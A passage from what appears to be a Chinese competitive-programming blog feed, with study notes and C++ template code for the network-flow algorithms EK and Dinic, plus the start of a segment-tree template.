class="keyword">int</span> y,<span class="keyword">int</span> w)</span></span>&#123;</span><br><span class="line">    edge[++cnt]=&#123;root[x],y,w&#125;;</span><br><span class="line">    root[x]=cnt;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">dfs</span><span class="params">(<span class="keyword">int</span> u)</span></span>&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=root[u];i;i=edge[i].next)&#123;</span><br><span class="line">        <span class="keyword">int</span> to=edge[i].to;</span><br><span class="line">        <span class="keyword">if</span>(fa[u]==to)<span class="keyword">continue</span>;</span><br><span class="line">        fa[to]=u;</span><br><span class="line">        <span class="comment">//edge[i^1].w=0;</span></span><br><span class="line">        <span class="built_in">dfs</span>(to);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(!edge[root[u]].next&amp;&amp;u!=r)&#123;</span><br><span class="line">        dest[u]=<span class="number">1</span>;</span><br><span class="line">    &#125; </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">find_path</span><span class="params">(<span class="keyword">int</span> now,<span class="keyword">int</span> from,<span class="keyword">int</span> flow)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(dest[now])<span class="keyword">return</span> flow;</span><br><span class="line">    <span class="keyword">int</span> qw=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=root[now];i;i=edge[i].next)&#123;</span><br><span class="line">        <span class="keyword">int</span> to=edge[i].to,w=edge[i].w;</span><br><span class="line">        </span><br><span class="line">        <span class="comment">//printf(&quot;to is %d w is %d\n&quot;,to,w);</span></span><br><span class="line">        <span class="keyword">if</span>(to==from)<span class="keyword">continue</span>;</span><br><span class="line">        <span class="keyword">if</span>(w==<span class="number">0</span>)<span class="keyword">continue</span>;</span><br><span class="line">        path.<span class="built_in">push</span>(i);</span><br><span class="line">        qw=<span class="built_in">find_path</span>(to,now,<span class="built_in">min</span>(flow,w));</span><br><span class="line">        <span class="keyword">if</span>(qw==<span class="number">0</span>)<span class="keyword">continue</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> qw;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">maxflow</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> ans=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span>(<span class="number">1</span>)&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">int</span> l=<span class="built_in">find_path</span>(r,<span class="number">0</span>,<span class="number">0x7fffffff</span>);</span><br><span class="line">        <span class="keyword">if</span>(l!=<span class="number">0</span>&amp;&amp;l!=<span class="number">0x7fffffff</span>)&#123;</span><br><span class="line">            ans+=l;</span><br><span class="line">            <span class="keyword">while</span>(path.<span class="built_in">size</span>())&#123;</span><br><span class="line">                <span class="keyword">int</span> e=path.<span class="built_in">top</span>();</span><br><span class="line">                path.<span class="built_in">pop</span>();</span><br><span class="line">                edge[e].w-=l;</span><br><span class="line">                edge[e^<span class="number">1</span>].w+=l; </span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//printf(&quot;ans=%d\n&quot;,ans);</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>,ans);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="comment">//freopen(&quot;P3931_2.in&quot;,&quot;r&quot;,stdin);</span></span><br><span class="line">    cin&gt;&gt;n&gt;&gt;r;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;n;i++)&#123;</span><br><span class="line">        <span class="keyword">int</span> x,y,w;</span><br><span class="line">        cin&gt;&gt;x&gt;&gt;y&gt;&gt;w;</span><br><span class="line">        <span class="built_in">add</span>(x,y,w);</span><br><span class="line">        <span class="built_in">add</span>(y,x,w);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">dfs</span>(r);</span><br><span class="line">    <span class="built_in">maxflow</span>();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这个数据量 $\text{10w}$ 都能过为啥能过呢，据评论区大佬说，因为树是二分图，因此增广路不会超过 $log_2n$ 条，因此这题我这么写能过，但是遇到非树的毒瘤图那真的 $200$ 都能卡住的，而且我下了一下标板的测试点，貌似就是会陷入死循环，我不知道哪里写出来的问题了。</p><h2 id="EK算法"><a href="#EK算法" class="headerlink" title="EK算法"></a>EK算法</h2><p>在高中的时候我们老师就讲过，在一般情况下，$\text{dfs}$ 一定是没有 $\text{bfs}$ 优的。因此我们每次都挑一个看上去路径最短的增广路，既然要求最短了我们就可以用 $\text{bfs}$ 去寻找增广路了。</p><p>EK算法可以通过标板——<a href="https://www.luogu.com.cn/problem/P3376">P3376</a></p><p>我写的程序</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> int long long</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> maxn 500</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> inf 0x3f3f3f3f3f3f3f3f</span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">eee</span>&#123;</span></span><br><span class="line">    <span class="keyword">int</span> to;</span><br><span class="line">    <span class="keyword">int</span> w;</span><br><span class="line">    <span class="keyword">int</span> next;</span><br><span class="line">&#125;edge[<span class="number">5005</span>&lt;&lt;<span class="number">1</span>];</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">ee</span>&#123;</span></span><br><span class="line">    <span class="keyword">int</span> v;</span><br><span class="line">    <span class="keyword">int</span> edge;</span><br><span class="line">&#125;pre[<span class="number">5005</span>&lt;&lt;<span class="number">1</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> root[maxn],inque[maxn],cnt=<span class="number">1</span>;</span><br><span class="line"><span class="keyword">int</span> n,m,s,t;</span><br><span class="line"><span class="function"><span class="keyword">inline</span> <span class="keyword">void</span> <span class="title">add</span><span class="params">(<span class="keyword">int</span> x,<span class="keyword">int</span> y,<span class="keyword">int</span> w)</span></span>&#123;</span><br><span class="line">    edge[++cnt]=&#123;y,w,root[x]&#125;;</span><br><span class="line">    root[x]=cnt;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">bfs</span><span class="params">()</span></span>&#123;</span><br><span class="line">    queue&lt;<span class="keyword">int</span>&gt;q;</span><br><span class="line">    <span class="built_in">memset</span>(inque,<span class="number">0</span>,<span class="built_in"><span class="keyword">sizeof</span></span>(inque));</span><br><span class="line">    <span class="built_in">memset</span>(pre,<span class="number">0xff</span>,<span class="built_in"><span class="keyword">sizeof</span></span>(pre));</span><br><span class="line">    inque[s]=<span class="number">1</span>;</span><br><span class="line">    q.<span class="built_in">push</span>(s);</span><br><span class="line">    <span class="keyword">while</span>(q.<span class="built_in">size</span>())&#123;</span><br><span class="line">        <span class="keyword">int</span> u=q.<span class="built_in">front</span>();</span><br><span class="line">        q.<span class="built_in">pop</span>();</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=root[u];i;i=edge[i].next)&#123;</span><br><span class="line">            <span class="keyword">int</span> v=edge[i].to;</span><br><span class="line">            <span class="keyword">if</span>(!inque[v]&amp;&amp;edge[i].w)&#123;</span><br><span class="line">                pre[v]=&#123;u,i&#125;;</span><br><span class="line">                <span class="keyword">if</span>(v==t)&#123;</span><br><span class="line">                    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">                &#125; </span><br><span class="line">                inque[v]=<span class="number">1</span>;</span><br><span class="line">                q.<span class="built_in">push</span>(v);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">EK</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">long</span> <span class="keyword">long</span> ans=<span class="number">0</span>;</span><br><span class="line">    <span class="comment">//printf(&quot;%lld\n&quot;,sizeof(ans));</span></span><br><span class="line">    <span class="keyword">while</span>(<span class="built_in">bfs</span>())&#123;</span><br><span class="line">        <span class="keyword">long</span> <span class="keyword">long</span> mi=inf;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=t;i!=s;i=pre[i].v)&#123;</span><br><span class="line">            mi=<span class="built_in">min</span>(mi,edge[pre[i].edge].w);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=t;i!=s;i=pre[i].v)&#123;</span><br><span class="line">            edge[pre[i].edge].w-=mi;</span><br><span class="line">            edge[pre[i].edge^<span class="number">1</span>].w+=mi;</span><br><span class="line">        &#125;</span><br><span class="line">        ans+=mi;</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%lld\n&quot;</span>,ans);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">sync</span><span class="params">()</span></span>&#123;</span><br><span class="line">    ios::<span class="built_in">sync_with_stdio</span>(<span class="number">0</span>);</span><br><span class="line">    cin.<span class="built_in">tie</span>(<span class="number">0</span>);</span><br><span class="line">    cout.<span class="built_in">tie</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">signed</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="comment">//freopen(&quot;P3376_7.in&quot;,&quot;r&quot;,stdin);</span></span><br><span class="line">    <span class="built_in">sync</span>();</span><br><span class="line">    cin&gt;&gt;n&gt;&gt;m&gt;&gt;s&gt;&gt;t;</span><br><span class="line">    <span class="keyword">while</span>(m--)&#123;</span><br><span class="line">        <span class="keyword">int</span> x,y,w;</span><br><span class="line">        cin&gt;&gt;x&gt;&gt;y&gt;&gt;w;</span><br><span class="line">        <span class="built_in">add</span>(x,y,w);</span><br><span class="line">        <span class="built_in">add</span>(y,x,<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">EK</span>();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="Dinic算法"><a href="#Dinic算法" class="headerlink" title="Dinic算法"></a>Dinic算法</h2><p>EK算法虽然比较优了，但是有一个情况还是比较费时的，如下图所示</p><p><img src="/2022/03/03/%E7%BD%91%E7%BB%9C%E6%B5%81%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/3.png" alt="3"></p><p>假设我 $S\to A$ 再经过更多的点，$A$ 后面的分支更多，那么每一次都要 $\text{bfs}$  开销也是很大的的，重要的是很多路我们会重复遍历。这里就体现出了 $\text{Dinic}$ 算法的优了。</p><p>它只需要开始一次 $\text{bfs}$ 就能处理多条路径，它的思想是这样的：先对网络进行 $\text{bfs}$ 分层，我只找这样的增广路：</p><p>对于路径上任意 $u\to v$ 的边，都有 $v$ 在 $u$ 的下一层。我一次可以处理多条增广路，如果没有增广路那么我将对网络重新分层，直到 $\text{bfs}$ 无法遍历到汇点时。</p><p>标程</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> int long long</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> maxn 505</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> maxe 5005</span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">eee</span>&#123;</span></span><br><span class="line">    <span class="keyword">int</span> to;</span><br><span class="line">    <span class="keyword">int</span> w;</span><br><span class="line">    <span class="keyword">int</span> next;</span><br><span class="line">&#125;edge[maxe&lt;&lt;<span class="number">2</span>];</span><br><span class="line"><span class="keyword">int</span> root[maxn],dep[maxn],cnt=<span class="number">1</span>,s,t,n,m,ans;</span><br><span class="line">queue&lt;<span class="keyword">int</span>&gt;q;</span><br><span class="line"><span class="function"><span class="keyword">inline</span> <span class="keyword">void</span> <span class="title">add</span><span class="params">(<span class="keyword">int</span> x,<span class="keyword">int</span> y,<span class="keyword">int</span> w)</span></span>&#123;</span><br><span class="line">    edge[++cnt]=&#123;y,w,root[x]&#125;;</span><br><span class="line">    root[x]=cnt;</span><br><span class="line">&#125; </span><br><span class="line"><span class="comment">//网络分层 </span></span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">bfs</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="comment">//puts(&quot;1&quot;);</span></span><br><span class="line">    <span class="keyword">while</span>(q.<span class="built_in">size</span>())q.<span class="built_in">pop</span>();</span><br><span class="line">    q.<span class="built_in">push</span>(s);</span><br><span class="line">    <span class="built_in">memset</span>(dep,<span class="number">0</span>,<span class="built_in"><span class="keyword">sizeof</span></span>(dep));</span><br><span class="line">    dep[s]=<span class="number">1</span>;</span><br><span class="line">    <span class="keyword">while</span>(q.<span class="built_in">size</span>())&#123;</span><br><span class="line">        <span class="keyword">int</span> u=q.<span class="built_in">front</span>();</span><br><span class="line">        q.<span class="built_in">pop</span>();</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=root[u];i;i=edge[i].next)&#123;</span><br><span class="line">            <span class="keyword">int</span> v=edge[i].to,w=edge[i].w;</span><br><span class="line">            <span class="keyword">if</span>(!dep[v]&amp;&amp;w)&#123;</span><br><span class="line">                dep[v]=dep[u]+<span class="number">1</span>;</span><br><span class="line">                q.<span class="built_in">push</span>(v);</span><br><span class="line">                </span><br><span class="line">            &#125;</span><br><span class="line">        &#125;    </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> dep[t];</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//从u出发，目前已有in的流量 </span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">dfs</span><span class="params">(<span class="keyword">int</span> u,<span class="keyword">int</span> in)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(u==t)<span class="keyword">return</span> in;</span><br><span class="line">    <span class="keyword">int</span> ans=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=root[u];i;i=edge[i].next)&#123;</span><br><span class="line">        <span class="keyword">int</span> v=edge[i].to,w=edge[i].w;</span><br><span class="line">        <span class="keyword">if</span>(dep[v]==dep[u]+<span class="number">1</span>&amp;&amp;w)&#123;</span><br><span class="line">            <span class="keyword">int</span> res=<span class="built_in">dfs</span>(v,<span class="built_in">min</span>(in,w));</span><br><span class="line">            edge[i].w-=res;</span><br><span class="line">            edge[i^<span class="number">1</span>].w+=res;</span><br><span class="line">            in-=res;</span><br><span class="line">            ans+=res;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(ans==<span class="number">0</span>)dep[u]=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">return</span> ans;    </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">sync</span><span class="params">()</span></span>&#123;</span><br><span class="line">    ios::<span class="built_in">sync_with_stdio</span>(<span class="number">0</span>);</span><br><span class="line">    cin.<span class="built_in">tie</span>(<span class="number">0</span>);</span><br><span class="line">    cout.<span class="built_in">tie</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">signed</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="built_in">sync</span>();</span><br><span class="line">    cin&gt;&gt;n&gt;&gt;m&gt;&gt;s&gt;&gt;t;</span><br><span class="line">    <span class="keyword">while</span>(m--)&#123;</span><br><span class="line">        <span class="keyword">int</span> x,y,w;</span><br><span class="line">        cin&gt;&gt;x&gt;&gt;y&gt;&gt;w;</span><br><span class="line">        <span class="built_in">add</span>(x,y,w);</span><br><span class="line">        <span class="built_in">add</span>(y,x,<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">int</span> ans=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span>(<span class="built_in">bfs</span>())&#123;</span><br><span class="line">        ans+=<span class="built_in">dfs</span>(s,<span class="number">0x7fffffffffffffff</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    cout&lt;&lt;ans&lt;&lt;endl;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>又一个板子收入囊中，网络流应该会 $\text{Dcini}$ 差不多了吧qwq。</p>]]></content>
      
      
      <categories>
          
          <category> icpc </category>
          
          <category> 图论 </category>
          
          <category> 网络流 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>线段树的学习笔记</title>
      <link href="/2022/02/25/%E7%BA%BF%E6%AE%B5%E6%A0%91%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
      <url>/2022/02/25/%E7%BA%BF%E6%AE%B5%E6%A0%91%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</url>
      
        <content type="html"><![CDATA[<p>最近复习一下线段树的板子。</p><span id="more"></span><p>就随便写吧，就写给自己看看的，因为即便是我学过板子，也基本会交错很多次。首先一个就是一定在开头加上一句话：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> int long long</span></span><br></pre></td></tr></table></figure><p>然后就是push_down的操作，一定是有标记的时候已经加完了，push_down的时候就是把标记分发下去然后给子节点加上值和lazy标记。</p><p>在add操作的时候一定要加上先push_down再加。</p><h2 id="线段树解决问题的范围"><a href="#线段树解决问题的范围" class="headerlink" title="线段树解决问题的范围"></a>线段树解决问题的范围</h2><p>要求在线，并且含有区间加法和区间查询的操作，下面是洛谷的板子题并给出标程，也可以当板子用。</p><h2 id="板子"><a href="#板子" class="headerlink" title="板子"></a>板子</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> int long long</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> maxn 1000005</span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">eee</span>&#123;</span></span><br><span class="line">    <span class="keyword">int</span> lazy;</span><br><span class="line">    <span class="keyword">int</span> l;</span><br><span class="line">    <span class="keyword">int</span> r;</span><br><span class="line">    <span class="keyword">int</span> sum;</span><br><span class="line">    <span class="keyword">int</span> <span class="keyword">operator</span>+(<span class="keyword">const</span> eee &amp;a)&#123;</span><br><span class="line">        <span class="keyword">return</span> sum+a.sum;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">length</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> (r-l+<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">mid</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> l+r&gt;&gt;<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;tree[maxn&lt;&lt;<span class="number">1</span>];</span><br><span class="line"><span class="keyword">int</span> a[maxn],ans;</span><br><span class="line"><span class="function"><span class="keyword">inline</span> <span class="keyword">void</span> <span class="title">build</span><span class="params">(<span class="keyword">int</span> l,<span class="keyword">int</span> r ,<span class="keyword">int</span> now)</span></span>&#123;</span><br><span class="line">    tree[now].l=l;</span><br><span class="line">    tree[now].r=r;</span><br><span class="line">    <span class="keyword">if</span>(l==r)&#123;</span><br><span class="line">        tree[now].sum=a[l];</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">int</span> mid=l+r&gt;&gt;<span class="number">1</span>;</span><br><span class="line">    <span class="built_in">build</span>(l,mid,now&lt;&lt;<span class="number">1</span>);</span><br><span class="line">    <span class="built_in">build</span>(mid+<span class="number">1</span>,r,now&lt;&lt;<span class="number">1</span>|<span class="number">1</span>);</span><br><span class="line">    tree[now].sum=tree[now&lt;&lt;<span class="number">1</span>]+tree[now&lt;&lt;<span class="number">1</span>|<span class="number">1</span>];</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">inline</span> <span class="keyword">void</span> <span class="title">push_down</span><span class="params">(<span class="keyword">int</span> now)</span></span>&#123;</span><br><span class="line">    <span class="comment">//if(tree[now].l==tree[now].r)return;</span></span><br><span class="line">    <span class="keyword">int</span> lazy=tree[now].lazy;</span><br><span class="line">    tree[now&lt;&lt;<span class="number">1</span>].sum+=lazy*tree[now&lt;&lt;<span class="number">1</span>].<span class="built_in">length</span>();</span><br><span class="line">    tree[now&lt;&lt;<span class="number">1</span>].lazy+=lazy;</span><br><span class="line">    tree[now&lt;&lt;<span class="number">1</span>|<span class="number">1</span>].sum+=lazy*tree[now&lt;&lt;<span class="number">1</span>|<span class="number">1</span>].<span class="built_in">length</span>();</span><br><span class="line">    tree[now&lt;&lt;<span class="number">1</span>|<span class="number">1</span>].lazy+=lazy;</span><br><span class="line">    tree[now].lazy=<span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">inline</span> <span class="keyword">void</span> <span class="title">add</span><span class="params">(<span class="keyword">int</span> l,<span class="keyword">int</span> r,<span class="keyword">int</span> num,<span class="keyword">int</span> i)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(l&lt;=tree[i].l&amp;&amp;r&gt;=tree[i].r)&#123;</span><br><span class="line">        tree[i].sum+=num*(tree[i].r-tree[i].l+<span class="number">1</span>);</span><br><span class="line">        <span class="comment">//tree[i].sum%=mod;</span></span><br><span class="line">        tree[i].lazy+=num;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">int</span> mid=tree[i].l+tree[i].r&gt;&gt;<span class="number">1</span>;</span><br><span class="line">        <span class="keyword">if</span>(tree[i].lazy)<span class="built_in">push_down</span>(i);</span><br><span class="line">        <span class="keyword">if</span>(l&lt;=mid)<span class="built_in">add</span>(l,r,num,i&lt;&lt;<span class="number">1</span>);</span><br><span class="line">        <span class="keyword">if</span>(r&gt;mid)<span class="built_in">add</span>(l,r,num,i&lt;&lt;<span class="number">1</span>|<span class="number">1</span>);</span><br><span class="line">        tree[i].sum=(tree[i&lt;&lt;<span class="number">1</span>].sum+tree[i&lt;&lt;<span class="number">1</span>|<span class="number">1</span>].sum);<span class="comment">//%mod;</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">inline</span> <span class="keyword">void</span> <span class="title">query</span><span 